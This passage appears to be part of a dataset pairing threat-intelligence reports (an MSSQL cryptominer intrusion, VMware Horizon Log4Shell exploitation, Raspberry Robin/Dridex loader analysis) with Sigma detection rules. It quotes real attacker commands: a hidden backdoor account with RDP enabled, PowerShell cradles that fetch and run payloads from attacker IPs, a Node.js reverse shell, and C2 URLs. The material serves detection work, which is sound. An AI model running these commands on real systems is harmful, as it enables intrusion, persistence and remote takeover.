tool's github page (see above) and tell your story by creating an issue on the issues page: https://github.com/KaLendis/CVE-2022-21882/issues ❤️.\n  \n  Detection Timestamp: 2022-06-07 23:44\n  AV Detection Ratio: 6 / 67\n```\n\nWe believe this tool may be a variation of NetworkServiceExploit.exe, which attempts to use NetworkService for privilege escalation.\n\n---\n\n## Persistence\n\nThe threat actors wrote a batch script (`1.bat`) that contained commands for establishing persistence on the compromised host. We see the creation of a new account and adding this account to the local administrators group.\n\n### Commands to create and add user:\n```\nNET USER Adminv$ !67hCS14ORVg /ADD /expires:never\nNET LOCALGROUP Administrators /ADD Adminv$\n```\n\nThey also made remote RDP connections possible by changing the `fDenyTSConnections` and `UserAuthentication` values to `0`.\n\n### Commands to enable RDP:\n```\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-TCP\" /v UserAuthentication /t REG_DWORD /d \"0\" /f\n```\n\nThe full contents of `1.bat` also included commands to hide the user account by adding it to the registry using \"Special Accounts\".\n\n### Command to hide user account:\n```\nREG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v Adminv$ /t REG_DWORD /d 0\n```\n\n---\n\n## Credential Access\n\nDuring the initial access, credentials were obtained via a brute-force attack against the exposed MSSQL server. No other credential access was observed during this intrusion, although the threat actors did enable WDigest to make later credential access easier.\n\n---\n\n## Command and Control\n\nWe observed that the domain `mymst007[.]info` is used to download further payloads. The domain was created five years ago. We have seen similar reports that make mention of the same infrastructure. Attacks associated with this domain include the same or similar tactics techniques and procedures (TTPs).\n\n```image\nAlt: Connections\nDescription: The image is a detailed diagram illustrating the connections and communications related to the domain 'mymst007.info'. It includes nodes representing contacted IPs, domains, downloaded files, and URLs, along with specific filenames such as 'CSRSS.exe' and 'weixin.html'. The diagram visually maps out the relationships and interactions between these elements, highlighting the command and control infrastructure associated with the observed cyber attacks.\nTranscription: |\n  - Resolutions\n    - mst.mymst007.info\n    - mst2.mymst007.info\n  - Siblings\n  - Contacted ips\n  - Contacted domains\n  - Communicating files\n  - Downloaded files\n    - weixin.html\n  - Referrer files\n    - 3f14dc75982f1abd67e66623c5c8277b8d109be96b6f8fef92e4c0be7b2c9b1\n    - wrmi-instance-script.txt (1e4fdd4670ddb98286ed18bb3940c812215b2e5bda0886589e397667000391f)\n    - 563d381d5f8c7fecc6bd8e228cdf8beccab81fe5b1cfb29ddc34dc779e70e1\n    - 1c496854a393f70196745be19e47d758d50df22e2ed3c247a2008576105f\n  - Contacted urls\n    - http://mst2.mymst007.info/\n    - http://mst2.mymst007.info:4000/ver\n    - http://mst.mymst007.info/\n    - http://mst.mymst007.info:8080/all.dll.asp\n    - http://mst.mymst007.info/perp2017/home2/pergavr2017/a.exe\n  - CSRSS.exe\n```\n\n---\n\n## Impact\n\nThe impact was concentrated on this one host. We did not see any further activity in this case. The compromised host had XMRig miner installed and running. The miner was also connecting to cryptomining pools such as `minergate[.]com`.\n\n---\n\n## Indicators\n\n### File\n\n```\nWinRing0x64.sys\n0c0195c48b6b8582fa6f6373032118da\nd25340ae8e92a6d29f599fef426a2bc1b5217299\n11bd2c9f9e2397c9a16e0990e4ed2cf0679498fe0fd418a3dfdac60b5c160ee5\n\nex.exe\na7bafac5ed29a68e0fff6eecc3f5bb3f\n4f19b6970e35b3d20f84a91e3af0d82c68096710\n428d06c889b17d5f95f9df952fc13b1cdd8ef520c51e2abff2f9192aa78a4b24\n\nkit.bat\n91931a2b1ae645004023e1b35fe57314\n9f5a7a293c92ef42374cf1471b653ed994446c15\n4905b7776810dc60e710af96a7e54420aaa15467ef5909b260d9a9bc46911186\n\nsmss.exe\ne579cd176b384b38eda6a0c61c51c274\n8a3b31ac12d9ac1a44707b1de75b8870189db83a\nd3c3f529a09203a839b41cd461cc561494b432d810041d71d41a66ee7d285d69\n\nxit\n88fba011db6e5122f4aa2c0343e11275\na2d34aeee2fb7c1ba57a11c03cc33e76f1217548\ncfa12bb31d58d30875b7a20ed05b5c100032b6a18802fbdf3913e70288e11a55\n\nxitmf\n0c8622c4871541e89d0173d5be0db8aa\nb01a88df39857417233d9bd3256f82d0fdcc63f8\nbeda317d74b8f1090e251205064e686d330a0502006a54dc94d528d6bd16c416\n```\n\n### Network\n\n```\nminergate[.]com\nmymst007[.]info\nbj87670@gmail.com\n```\n\n---\n\n## Detections\n\n### Sigma Rules\n\n- Suspicious Commands by SQL Server\n- MOFComp Execution\n- Hiding Local User Accounts\n\n### Yara Rules\n\n```\nrule miner_batch {\n   meta:\n      description = \"file kit.bat\"\n      author = \"TheDFIRReport\"\n      reference = \"https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/\"\n      date = \"2022/07/10\"\n      hash1 = \"4905b7776810dc60e710af96a7e54420aaa15467ef5909b260d9a9bc46911186\"\n   strings:\n      $a1 = \"%~dps0\" fullword ascii\n      $a2 = \"set app\" fullword ascii\n      $a3 = \"cd /d \\\"%~dps0\\\"\" fullword ascii\n      $a4 = \"set usr=jood\" fullword ascii\n      $s1 = \"schtasks /run\" fullword ascii\n      $s2 = \"schtasks /delete\" fullword ascii\n      $a5 = \"if \\\"%1\\\"==\\\"-s\\\" (\" fullword ascii\n   condition:\n      uint16(0) == 0xfeff and filesize < 1KB and\n      3 of ($a*) and 1 of ($s*)\n}\n```\n\n---\n\n## MITRE Techniques\n\n```\nT1053.005 - Scheduled Task/Job: Scheduled Task\nT1136.001 - Create Account: Local Account\nT1546.003 - Event Triggered Execution: Windows Management Instrumentation Event Subscription\nT1564.002 - Hide Artifacts: Hidden Users\nT1059.003 - Command and Scripting Interpreter: Windows Command Shell\nT1027.004 - Obfuscated Files or Information: Compile After Delivery\nT1110.001 - Brute Force: Password Guessing\nT1070.004 - Indicator Removal on Host: File Deletion\nT1562.001 – Impair Defenses: Disable or Modify Tools\nT1546.012 - Event Triggered Execution: Image File Execution Options Injection\nT1140 - Deobfuscate/Decode Files or Information\nT1112 - Modify Registry\nT1078 - Valid Accounts\nT1134.001 - Token Impersonation/Theft\n```",
    "sigma_rule": {
      "title": "New User Created Via Net.EXE With Never Expire Option",
      "id": "b9f0e6f5-09b4-4358-bae4-08408705bd5c",
      "related": [
        {
          "id": "cd219ff3-fa99-45d4-8380-a7d15116c6dc",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects creation of local users via the net.exe command with the option \"never expire\"",
      "references": [
        "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-12",
      "modified": "2023-02-21",
      "tags": [
        "attack.persistence",
        "attack.t1136.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\net.exe",
              "\\net1.exe"
            ]
          },
          {
            "OriginalFileName": [
              "net.exe",
              "net1.exe"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "user",
            "add",
            "expires:never"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_net_user_add_never_expire.yml",
    "id": "286"
  },
  {
    "url": "https://www.rapid7.com/blog/post/2022/01/18/active-exploitation-of-vmware-horizon-servers/",
    "markdown": "# Active Exploitation of VMware Horizon Servers\n\n**Date**: Jan 18, 2022\n\n_Last updated at Mon, 07 Feb 2022 15:41:09 GMT_\n\n*This post is co-authored by Charlie Stafford, Lead Security Researcher.*\n\n*We will update this blog with further information as it becomes available.*\n\n| CVE            | Vendor Advisory | AttackerKB | IVM Content      | Patching Urgency | Blog's Last Update           |\n| -------------- | --------------- | ---------- | ---------------- | ---------------- | ---------------------------- |\n| CVE-2021-44228 | VMware Advisory | AttackerKB | February 4, 2022 | Emergency        | February 7, 2022 10:40 AM ET |\n\n## Summary\n\nAttackers are actively targeting VMware Horizon servers vulnerable to Apache Log4j CVE-2021-44228 (Log4Shell) and related vulnerabilities that were patched in December 2021. We’re sharing our observed activities and indicators of compromise (IOCs) related to this activity.\n\n## Details\n\nBeginning Friday, January 14, 2022, Rapid7 Managed Detection & Response (MDR) began monitoring a sudden increase in VMware Horizon exploitation. The activity our teams are observing is similar to observed threat activity detailed by NHS Digital. Rapid7 services and research teams expect to see a continued strong upward trend in attacker activity directed at VMware Horizon instances vulnerable to Log4Shell exploits.\n\n## Rapid7 Customers\n\nRapid7 InsightIDR and MDR customers: Alerts generated by the following detection rules can assist in identifying successful VMware Horizon exploitation:\n\n- **Attacker Technique - PowerShell Download Cradles** (created: Thursday, January 3, 2019, 15:31:27 UTC)\n- **Suspicious Process - VMWare Horizon Spawns CMD or PowerShell** (created: Thursday, January 6, 2022, 14:18:21 UTC)\n  - On January 19, 2022 this rule has been renamed \"Suspicious Process - VMWare Horizon Spawns Process\"\n\nRapid7 researchers are currently evaluating the feasibility of adding a VMware Horizon vulnerability check for Nexpose/InsightVM.\n\nWe have a dedicated resource page for the Log4j vulnerability, which includes our AttackerKB analysis of Log4Shell containing a proof-of-concept exploit for VMware Horizon.\n\n## Recommendations\n\n**Patch Immediately**: Organizations that still have a vulnerable version of VMware Horizon in their environment should update to a patched version of Horizon on an emergency basis and review the system(s) for signs of compromise. As a general practice, Rapid7 recommends never exposing VMware Horizon to the public internet, only allowing access behind a VPN.\n\nOrganizations are advised to proactively block traffic to the IPs/URLs listed in the IOCs section.\n\n## Observed Activities\n\nRapid7's Threat Intelligence and Detection Engineering (TIDE) team has identified five unique avenues that attackers have taken post-exploitation, indicating that multiple actors are involved in this mass exploitation activity.\n\nThe most common activity sees the attacker executing PowerShell and using the built-in System.Net.WebClient object to download cryptocurrency mining software to the system.\n\nTIDE has observed the attacker downloading cryptocurrency miners from the following URLs:\n\n- `http://72.46.52[.]135/mad_micky.bat`\n- `http://80.71.158[.]96/xms.ps1`\n- `http://101.79.1[.]118/2.ps1`\n\nThe following is an example PowerShell command from this activity (note that these contents were originally base64 encoded):\n\n> `$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('http://72.46.52[.]135/mad_micky.bat', $tempfile); & $tempfile`\n\nThe System.Net.WebClient download cradle has also been used by one unknown actor to deploy a reverse shell based on Invoke-WebRev (https://raw.githubusercontent.com/3v4Si0N/HTTP-revshell/master/Invoke-WebRev.ps1) from `http://87.121.52[.]221:443/dd.ps1`. Another actor has used it to download a Cobalt Strike backdoor from `http://185.112.83[.]116:8080/drv`. This backdoor was created using the trial version of Cobalt Strike, meaning it contains the EICAR anti-virus test string which should be identified by any AV vendor.\n\nOne actor attempts to use System.Net.WebClient to download a rudimentary backdoor from `http://0.tcp.ngrok[.]io:18765/qs.exe`. If this method fails, the PowerShell BitsTransfer object is used as a backup download method. In this instance, the actor is using ngrok[.]io URLs. NGrok is a tool that allows a user to tunnel traffic through a NAT or firewall. The backdoor communicates with `http://2.tcp.ngrok[.]io:19969/index.php` and will execute PowerShell commands received from that host.\n\nExample command from this activity:\n\n> `$a=\"http://0.tcp.ngrok[.]io:18765/qs.exe\";$b=\"c:\\windows\\temp\\qs.exe\";$c = \"c:\\users\\public\\qs.exe\";Import-Module BitsTransfer;try{(New-Object System.Net.WebClient).DownloadFile($a, $b);Start-Process -FilePath $b;exit;}catch{};try{Start-BitsTransfer -Source $a -Destination $b;Start-Process -FilePath $b;exit;}catch{};try{(New-Object System.Net.WebClient).DownloadFile($a, $c);Start-Process -FilePath $c;exit;}catch{};try{Start-BitsTransfer -Source $a -Destination $c;Start-Process -FilePath $c;exit;}catch{}`\n\nThe final method TIDE has observed at Rapid7 customers involves the attacker using the copy of Node included with the VMWare server at `C:\\Program Files\\VMware\\VMware View\\Server\\appblastgateway\\node.exe`. Node is used to execute a small snippet of JavaScript code that establishes a reverse shell to `146.59.130.58`:\n\n> `C:\\\"Program Files\"\\VMware\\\"VMware View\"\\Server\\appblastgateway\\node.exe -r net -e \"sh = require('child_process').exec('cmd.exe');var client = new net.Socket();client.connect(4460, '146.59.130.58', function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});\"`\n\n## Indicators of Compromise (IOC)\n\nThe full list of IOCs that TIDE has observed related to this activity is as follows:\n\n- **72.46.52[.]135**\n  - mad_micky.bat\n  - 58e22726592ec5ab6ca49eda2fdb7017\n- **80.71.158[.]96**\n  - xms.ps1\n  - e397087edf21ad9da907b595691ce15e\n- **101.79.1[.]118**\n  - 2.ps1\n  - 6422ede9aadd1a768cb57fe06c1155ad\n- **87.121.52[.]221**\n  - dd.ps1\n  - f7d5a47321e436fe33e03c4dbf29bd92\n- **185.112.83[.]116**\n  - drv\n  - 00a4e6f11d2dae5146995aa489292677\n- **0.tcp.ngrok[.]io:18765**\n- **2.tcp.ngrok[.]io:19969**\n  - qs.exe\n  - 1fcf790cc9c66794ae93c114c61b412e\n- **146.59.130.58**\n\n## Updates\n\n- **January 19, 2020** - IDR rule `VMWare Horizon Spawns CMD or PowerShell` has been renamed `Suspicious Process - VMWare Horizon Spawns Process`.\n- **February 4, 2022** - IVM content has been added for CVE-2021-4506 (the Log4j weakness identified within VMware Horizon Connection Server).",
    "sigma_rule": {
      "title": "Potential Arbitrary Code Execution Via Node.EXE",
      "id": "6640f31c-01ad-49b5-beb5-83498a5cd8bd",
      "status": "test",
      "description": "Detects the execution node.exe which is shipped with multiple software such as VMware, Adobe...etc. In order to execute arbitrary code. For example to establish reverse shell as seen in Log4j attacks...etc",
      "references": [
        "https://blog.talosintelligence.com/lazarus-three-rats/",
        "https://www.sprocketsecurity.com/resources/crossing-the-log4j-horizon-a-vulnerability-with-no-return",
        "https://www.rapid7.com/blog/post/2022/01/18/active-exploitation-of-vmware-horizon-servers/",
        "https://nodejs.org/api/cli.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-09",
      "modified": "2023-02-03",
      "tags": [
        "attack.defense-evasion",
        "attack.t1127"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_main": {
          "Image|endswith": "\\node.exe",
          "CommandLine|contains": [
            " -e ",
            " --eval "
          ]
        },
        "selection_action_reverse_shell": {
          "CommandLine|contains|all": [
            ".exec(",
            "net.socket",
            ".connect",
            "child_process"
          ]
        },
        "condition": "selection_main and 1 of selection_action_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_node_abuse.yml",
    "id": "292"
  },
  {
    "url": "https://securityintelligence.com/posts/raspberry-robin-worm-dridex-malware/",
    "markdown": "# Raspberry Robin and Dridex: Two birds of a feather\n\nIBM Security Managed Detection and Response (MDR) observations coupled with IBM Security X-Force malware research sheds additional light on the mysterious objectives of the operators behind the Raspberry Robin worm. Based on a comparative analysis between a downloaded Raspberry Robin DLL and a Dridex malware loader, the results show that they are similar in structure and functionality. Thus, IBM Security research draws another link between the Raspberry Robin infections and the Russia-based cybercriminal group ‘Evil Corp,’ which is the same group behind the Dridex Malware, suggesting that Evil Corp is likely using Raspberry Robin infrastructure to carry out its attacks.\n\nWhen Raspberry Robin infection attempts were first observed impacting a few IBM Security MDR customers in mid-May 2022, the enigmatic worm activity began to quickly spread within a client’s network from users sharing USB devices. The infections spiked in early June and by early August spikes of Raspberry Robin infection attempts were observed in 17% of worldwide MDR clients in the oil and gas, manufacturing, and transportation industries. This number is significant as historically less than 1% of MDR clients have seen the same strain of malware.\n\n## Raspberry Robin and Evil Corp connection\n\nThe ultimate objective of Raspberry Robin had been unknown. Microsoft researchers observed millions of Raspberry Robin infections, but no evidence of post-infection exploits had been seen in the wild until July 26, 2022, when Microsoft disclosed that they had uncovered existing Raspberry Robin infections delivering FAKEUPDATES malware (aka SocGholish).\n\nThe disclosure by the Microsoft threat researchers revealed that the “… DEV-0206-associated FAKEUPDATES activity on affected systems has since led to follow-on actions resembling DEV-0243 pre-ransomware behavior.” This statement indicates a possible relationship between Raspberry Robin and DEV-0243, which the cyber intelligence community tracks as “Evil Corp”.\n\nThe relationship between the threat actor behind FAKEUPDATES and Evil Corp is not new. Evil Corp had been leveraging FAKEUPDATES since at least April 2018 as the initial infection vector for the info-stealing Dridex malware that later resulted in deployment of DOPPLEPAYMER ransomware.\n\nThe US Treasury sanctioned Evil Corp in 2019 but the group had already begun deploying custom ransomware-as-a-service (RaaS) payloads, rebranding them as WastedLocker, before shifting to the well-known RaaS LockBit ransomware. Using RaaS allows Evil Corp to blend in with other affiliates that would hinder attribution and ultimately skirt around sanctions.\n\n## Raspberry Robin infection chain\n\nRaspberry Robin, also known as the QNAP worm, is typically delivered by a USB device, which contains a malicious Microsoft shortcut (.LNK) file. Once the user clicks on the .LNK file, it spawns a malicious command referencing msiexec.exe, a legitimate Windows system utility, to download and execute an MSI installer from a command and control (C2) domain. The C2 domain is usually recently registered, comprised of a few characters, and hosts a compromised QNAP NAS device that serves up a login page.\n\nThe msiexec commands observed by the IBM Security MDR team uses mixed-case syntax to evade detection, contain the victim’s hostname and username, and connect over a non-standard HTTP port 8080:\n\n```\nCommand Line: msieXeC /q /I \"S8 [.]Cx:8080/random\nstring/coMpUTErname=USER\"\n```\n\nDuring the infection, msiexec.exe also utilizes other legitimate Windows system utilities and tools, known as living-off-the-land binaries (LOLBin) such as rundll32.exe, fodhelper.exe, regsvr32.exe, dllhost.exe, and odbcconf.exe to load and execute the downloaded Raspberry Robin loader dynamic link libraries (DLL). Representative samples of such DLLs were analyzed in-depth by IBM X-Force reverse engineers.\n\n## X-Force malware research\n\nX-Force analyzed two components that have been attributed to a Raspberry Robin infection. The components are two dynamic link libraries (DLLs) hereafter referred to as Raspberry Robin loaders that were previously analyzed by Red Canary. As mentioned above, the loaders were downloaded as a result of a victim clicking a malicious .LNK file which launched msiexec to download and execute an MSI installer. The MSI Installer then drops a Raspberry Robin loader to the system. X-Force reverse engineers performed analysis to provide additional details about the operation and structure of Raspberry Robin loader variants and compared one variant to a 64-bit Dridex loader.\n\nThis comparative analysis provided information that helps draw a link between Raspberry Robin infections and Dridex malware loaders. The comparative analysis revealed that the two are very similar in functionality and structure. The intermediate loaders, decoded by each, were also found to be similar, containing code to perform hook detections and using similar algorithms to decode the payload.\n\n### Analysis details (Raspberry Robin loaders)\n\nThe Raspberry Robin loaders are DLLs that decode and execute an intermediate loader. The intermediate loader performs hook detection as an anti-analysis technique, decodes its strings at runtime and then decodes a highly obfuscated DLL whose purpose has not been determined.\n\n### Raspberry Robin loader variant 1 (SHA256: c0a13af59e578b77e82fe0bc87301f93fc2ccf0adce450087121cb32f218092c)\n\nUpon execution, Raspberry Robin Loader variant 1 enters a loop where it calculates the CRC32 hash of an encrypted block of data for 0x13h (29) iterations. One theory is this calculation loop is possibly a delayed attempt as the loader does not appear to use the hash in any additional operations. During stage 1 of the payload decryption process, the DLL utilizes an array of indexes and sizes. Each index points to a block of the encrypted payload. The block is then shifted, and the result is later XOR decrypted with a 64-byte key.\n\n```image\nAlt: Structure of the decryption components and encrypted payload embedded in a Raspberry Robin Loader\nDescription: The image displays a hexadecimal representation of data related to the Raspberry Robin Loader, specifically illustrating its structure. The layout is divided into sections with color-coded annotations indicating various components: an 'index and size table' in green, an 'xor key' in yellow, and a section labeled 'Contains encrypted payload' in blue. The hexadecimal values are shown alongside their memory addresses, which provide insight into the loader's decryption components and the organization of the encrypted payload.\n```\n\n*Figure 1 — Structure of the decryption components and encrypted payload embedded in a Raspberry Robin Loader*\n\nAdditionally, the loader decodes the first 0x117 (279) bytes of its .text PE section starting at raw offset 0x400. The decoding algorithm is represented by the python code below:\n\n```\nkey = 0xC2D16F15\ndec = bytearray()\nfor b in data:\n    key_byte = (key & 0xFF)\n    dec.append(b ^ key_byte)\n    key = rotate_right(key, 8)\n```\n\nThe decoded code finds the loaded **kernel32.dll** by enumerating through loaded modules looking for names that have a “.” as the 16th character and “32” starting at position 12 in the wide-formatted name. The loader continues execution passing the hash value **0xFC910371** and kernel32.dll’s base address to a function that enumerates the library’s export table. This function calculates a hash of each exported function name to resolve the *VirtualAlloc()* API function.\n\nThe function *VirtualAlloc()* is used to allocate a buffer to which the first decrypted payload is copied. The payload is then XOR decrypted with a 64-byte key.\n\n### Raspberry Robin loader variant 2 (SHA256: 1a5fcb209b5af4c620453a70653263109716f277150f0d389810df85ec0beac1)\n\nUpon execution, Raspberry Robin Loader variant 2 attempts to detect hooks in the function *wglGetProcAddress()*. This variant attempts to detect hooks in the *LdrLoadDll()* function. This is performed as an anti-analysis technique that helps the malware determine if the process is being monitored by security software. Specifically, the intermediate loader checks for the jump instructions 0xFF25 and 0xB8.\n\n```image\nAlt: Intermediate Loader’s hook detection function\nDescription: The image shows a snippet of code that appears to be a function for recursive hook detection in malware, specifically related to the Raspberry Robin loader. The function checks specific byte values in an operation code (op_code) array to determine if certain hooking mechanisms are present. It includes conditional statements for checking the op_code values and returns a flag indicating detection status.\nTranscription: |\n  c\n  __cdecl recursive_hook_detection_sub_401450(unsigned __int8 *op_code)\n  {\n      bool flag; // [esp+Fh] [ebp-Dh]\n  \n      // recursive hook detection\n      if (*op_code == 0xFF && op_code[1] == 0x25)\n          return recursive_hook_detection_sub(*(*op_code + 2));\n      flag = 0;\n      if (*op_code == 0xB8)\n      {\n          flag = 0;\n          if (op_code[3] == 0x50)\n              return op_code[4] == 0xCD;\n      }\n      return flag;\n  }\n```\n\n*Figure 2 — Intermediate Loader’s hook detection function*\n\nThen it proceeds to create an 88-byte structure used to store data used during execution. This loader also contains obfuscated notable API function and library names which are decoded by subtracting each byte in the 16-byte key, 0xB6B6AF8660D4760385C431119F7DE2B6, from the encoded string byte.\n\nNext, the loader RC4 decrypts an intermediate loader using the 32-byte key: 0x300EAEBAAF2512BFA8B473A085005D629CA9D2A79A8BD924687C04D7605E3015.\n\nOnce decrypted, the intermediate loader contains a malformed PE header. The malformed PE header is later patched with the appropriate values to allow execution of the module. Notably, the intermediate loader, discussed in the next section also patches the header of its payload during execution.\n\n```image\nAlt: Decrypted intermediate Loader’s malformed PE header\nDescription: The image shows a hexadecimal representation of binary data, highlighting an obfuscated MZ header within the data. The section labeled 'Obfuscated MZ header' is marked with an arrow to indicate its significance. The lower part of the image includes ASCII text that appears to contain error messages, suggesting that the program cannot run in DOS mode. This image provides technical details relevant to the analysis of the Raspberry Robin malware, specifically related to its loader's structure.\n```\n\n*Figure 3 — Decrypted intermediate Loader’s malformed PE header*\n\n### Intermediate loader\n\nThe intermediate loader is responsible for decrypting and executing the final payload. Ultimately, the intermediate loader copies the final payload to the process space of the original loader, Raspberry Robin Loader variant 2 and then executes it.\n\nDuring execution, the intermediate loader decodes library and API function names using inline decoding algorithms and then resolves the function addresses via a call to *LdrGetProcedureAddress()*. The function *LdrGetProcedureAddress()* is obtained by enumerating **ntdll.dll’s** export table.\n\n```image\nAlt: Inline decoding algorithm used to decode library and API function names.\nDescription: The image is a code snippet showing an inline decoding algorithm used to decode the library and API function names, specifically the decoding of 'LoadLibraryA'. It includes variable assignments and function calls, highlighting how addresses are resolved and libraries are manipulated in the context of malware operation. The snippet provides crucial insight into the technical mechanisms employed by the intermediate loader in the context of malware behavior.\nTranscription: |\n  handle_relocations(a1->current_loader, a1->field_38);\n  for (i = 0; i != 20; i += 4 )\n  {\n      v1 = i[0x403113] - i[0x403070];  // decode LoadLibraryA\n      v2 = i[0x403114] - i[0x403071];\n      v3 = i[0x403115] - i[0x403072];\n      func_name[i + 3] = i[0x403116] - i[0x403073];\n      func_name[i + 2] = v3;\n      func_name[i + 1] = v2;\n      func_name[i] = v1;\n  }\n  kernel32_base = get_module_base(0x403020, 0); // kernel32.dll\n```\n\n*Figure 4 — Inline decoding algorithm used to decode library and API function names.*\n\nThe decoded library and function names from the intermediate loader are shown below:\n\n```\nLdrGetProcedureAddress\nkernel32.dll\nLoadLibraryA\nGetPrcAddress\nVirtualAlloc\nVirtualProtect\n```\n\n## Comparative analysis (Raspberry Robin loader vs. Dridex loader)\n\nX-Force performed a comparative analysis of a 32-bit Raspberry Robin downloaded loader and a 64-bit Dridex loader. This comparative analysis provided information that draws a link between Raspberry Robin loaders and Dridex malware loaders. The comparative analysis revealed that the two are very similar in functionality and structure. The intermediate loaders decoded the final payload in a similar manner and contained anti-analysis code that performed hook detection in the *LdrLoadDll()* function.\n\nComparative analysis of the two samples reveals the following:\n\n**File hashes**\n\n| Loader Variant                   | SHA256 Hash                                                      |\n| -------------------------------- | ---------------------------------------------------------------- |\n| Raspberry Robin Loader variant 1 | 1a5fcb209b5af4c620453a70653263109716f277150f0d389810df85ec0beac1 |\n| Dridex Loader                    | b30b76585ea225bdf8b4c6eedf4e6e99aff0cf8aac7cdf6fb1fa58b8bde68ab3 |\n\nThe string decoding algorithms are similar, subtracting the key byte from the encoded byte.\n\n```image\nAlt: String decoding algorithm found in Raspberry Robin Loader and Dridex Loader\nDescription: The image displays two code snippets comparing the string decoding algorithms of the Raspberry Robin Loader (top) and the Dridex Loader (bottom). The Raspberry Robin Loader's function is shown with a line of code that performs a decoding operation by subtracting a key byte from an encoded byte. The Dridex Loader's function also shows a similar approach, using a different syntax but with the same operational logic. The two snippets illustrate a comparative analysis of how both malware loaders handle string decoding, highlighting their similarities in implementation.\nTranscription: |\n  decode_sub_4013F0(a1, encoded, i, key[i & 15], i);\n  {\n      int result; // eax\n      LOBYTE(result) = *(encoded + indx) - key_Byte;\n      *(a1 + indx) = result;\n      return result;\n  }\n  \n  int64 __fastcall decode_sub_1400132F0(__int64 buffer, __int64 encoded, int size)\n  {\n      __int64 result; // rax\n      __int64 indx; // [rsp+0h] [rbp-48h]\n      __int16 v5; // [rsp+36h] [rbp-12h]\n  \n      if (size) {\n          indx = 0i64;\n          do {\n              v5 ^= 0x72E1u;\n              *(buffer + indx) = *(encoded + indx) - key[indx & 15];\n              result = indx + 1;\n              indx = result;\n          } while (result != size);\n      }\n      return result;\n  }\n```\n\n*Figure 5 — String decoding algorithm found in Raspberry Robin Loader and Dridex Loader*\n\nBoth contain seemingly random strings in the PE’s data section.\n\n```image\nAlt: Seemingly random strings found in Raspberry Robin Loader and Dridex Loader\nDescription: The image presents a side-by-side comparison of seemingly random strings extracted from two malware loaders: the Raspberry Robin Loader on the left and the Dridex Loader on the right. Each column displays a list of encoded or obfuscated strings that are likely part of the malware's functionality. The layout emphasizes the similarities in the structure of the strings between the two loaders, supporting the comparative analysis discussed in the accompanying text.\nTranscription: |\n  Raspberry Robin Loader\n  IBtheirspiritCwingedeIB\n  havedryplace\n  abundantly7zwaters.J0veryE\n  hislandi\n  goodgodbeginning\n  yfor.isn.tsaidWingedseedRbehold\n  thembearingtogethermfrom\n  beholdMale1R\n  Subdue.rcreatureabundantlythey.rewatersandreplenish\n  wflyFrom\n  sv3beholdcreated\n  z80JSecondunder.M\n  hathlFowlmidst.uYdominionwatersandS\n  JlifedFS\n  clifeoverW0were.\n  dsaidbringg9placetogether.a\n  themvkind\n  fishnformaMovingmadewereisin.t\n  \n  Dridex Loader\n  bdatedpreventinggUTIL\n  ZoJGThesecurityfprivacy\n  vhomesameD\n  pprincoebetterChromiumfSbeenprocess\n  roughly4.10RLZinstall2009,ZbecauseS\n  Omnibox,browsers,HRAaccountq12009,\n  upaddedWebKit,\n  YSinceaPoint2Mweb-based\n  RincreasedcontainD\n  KInBouOmnibox,b\n  languageiv\n  NRThexonaelection.\n  ktwiceinitial1xmanagementraiders\n  dCdownloadb\n  this,5v\n  been4OnK\n  proughlypaul8existingUWGoogleGoogleT\n  Wwithuntiluserspucker1mS\n  are0forchannelzThist\n```\n\n*Figure 6 — Seemingly random strings found in Raspberry Robin Loader and Dridex Loader*\n\nThe samples contain similar inline loops that decode notable strings.\n\n```image\nAlt: Inline string decoding algorithms found in Raspberry Robin Loader and Dridex Loader\nDescription: The image depicts a side-by-side comparison of code snippets from two malware loaders: the Raspberry Robin Loader (top) and the Dridex Loader (bottom). Each snippet illustrates their respective string decoding algorithms. The Raspberry Robin Loader uses a loop with a specific index to manipulate data from a data section, while the Dridex Loader employs a do-while loop to achieve a similar outcome with different variable assignments. The layout highlights the similarities in the structure and functionality of both loaders.\nTranscription: |\n  ```\n  for ( index = 0; index < 0x1FF; ++index )\n  {\n      v8 = data_sect[39 * index + 38];\n      v11 = LOWORD(data_sect[0x27 * index + 0xF]);\n      v8 ^= v11;\n      size += v8;\n  }\n  ```\n  **Raspberry Robin Loader**\n  \n  ```\n  do\n  {\n      v2 = *(&data_sect + 62 * index + 0x3B);\n      v28 = 0x77F2A5CA;\n      v3 = v24 + (*(&data_sect + 0x3E * index + 0x3A) ^ v2);\n      v27 = 0x5E93;\n      v17 = v3;\n      ++index;\n      v28 = 0xEFE54B94;\n      v24 = v3;\n  }\n  while ( index != v30 - 0x5AD9135A );\n  ```\n  **Dridex Loader**\n```\n\n*Figure 7 — Inline string decoding algorithms found in Raspberry Robin Loader and Dridex Loader*\n\nNotably, an RC4 decryption function is called at the end of the function containing the above loops. Subsequently, values such as the encrypted payload offset and size are assigned to a structure as shown below.\n\n```image\nAlt: Values assigned to a structure. The values represent the size and offset of the payload\nDescription: The image displays a side-by-side comparison of code snippets from the Raspberry Robin loader and the Dridex loader. The top section shows the code from the Raspberry Robin loader, outlining a function that leads to an RC4 encryption process, with variables indicating payload offsets and sizes. The bottom section presents the Dridex loader's code, which similarly calls an 